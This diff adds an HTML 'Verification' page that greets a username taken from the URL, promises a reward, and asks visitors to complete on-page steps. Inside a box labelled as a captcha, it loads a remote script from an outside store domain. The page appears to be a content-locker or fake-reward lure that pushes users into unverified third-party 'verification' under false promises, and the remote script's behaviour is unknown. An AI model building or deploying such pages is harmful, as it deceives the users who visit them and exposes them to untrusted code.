@@ -1,0 +1,87 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Verification</title>
+<style>
+body {
+  background: radial-gradient(circle at top, #171726, #0d0d14);
+  color: white;
+  font-family: Arial, sans-serif;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  height: 100vh;
+  text-align: center;
+  flex-direction: column;
+  padding: 20px;
+}
+
+h1 {
+  font-size: 36px;
+  margin-bottom: 20px;
+  color: #ff003c;
+}
+
+#usernameDisplay {
+  font-size: 24px;
+  margin-bottom: 30px;
+  color: #00ff99;
+}
+
+p {
+  margin: 12px 0;
+  font-size: 16px;
+  line-height: 1.6;
+  max-width: 600px;
+}
+
+/* Captcha placeholder */
+#captchaContainer {
+  margin-top: 30px;
+  padding: 25px;
+  width: 320px;
+  max-width: 100%;
+  background: linear-gradient(145deg, #1c1c28, #14141c);
+  border-radius: 15px;
+  box-shadow: 0 10px 30px rgba(0,255,153,0.2);
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  color: #888;
+  font-size: 16px;
+  text-align: center;
+}
+</style>
+</head>
+<body>
+
+<h1>Verification</h1>
+
+<div id="usernameDisplay">Username: </div>
+
+<p>Welcome! To claim your reward, please follow the instructions carefully.</p>
+<p>Make sure to complete all the steps displayed on this page to successfully receive your reward.</p>
+<p>Keep this page open while completing the verification to avoid losing your progress.</p>
+
+<!-- Captcha placeholder -->
+<div id="captchaContainer">
+  <div data-captcha-enable="true"></div>
+  <script type="text/javascript" src="https://lockedapp.store/cp/js/8wwk0"></script>
+</div>
+
+<script>
+// Get username from URL
+const params = new URLSearchParams(window.location.search);
+const username = params.get("username");
+
+// Validate username length (3–20 chars)
+if(username && username.length >= 3 && username.length <= 20) {
+  document.getElementById("usernameDisplay").textContent = `Username: ${username}`;
+} else {
+  document.getElementById("usernameDisplay").textContent = "Invalid Username";
+}
+</script>
+
+</body>
+</html>
